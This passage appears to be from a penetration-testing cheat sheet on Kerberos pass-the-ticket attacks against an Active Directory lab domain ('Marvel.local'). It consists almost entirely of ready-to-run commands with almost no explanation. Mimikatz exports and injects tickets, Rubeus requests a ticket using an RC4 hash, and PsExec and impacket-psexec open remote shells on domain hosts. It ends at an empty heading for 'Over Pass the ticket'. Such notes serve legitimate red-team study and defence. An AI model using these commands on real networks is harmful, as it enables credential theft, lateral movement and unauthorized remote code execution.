

#### Pass the ticket :
```bash
#using the mimikatz.exe
kerberos::list
kerberos::list /export

kerberos::ptt ticket.kirbi
misc::cmd

#using the Rubeus
Rubeus.exe asktgt /domain:Marvel.local /user:Administrator /rc4:f56a8399599f1be040128b1dd9623c29 /ptt
dir \\<domain-ip>\C$ 
PsExec.exe \\192.168.1.105 cmd.exe


#using impacket-getTGT
impacket-getTGT -dc-ip 192.168.154.134 Marvel.local/hawkeye

export KRB5CCNAME=hawkeye.ccache

impacket-psexec -dc-ip 192.168.154.134 -target-ip 192.168.154.131 -no-pass -k Marvel.local/hawkeye@THE-PUNISHER.MARVEL.local
```


#### Over Pass the ticket (PTH + PTT) :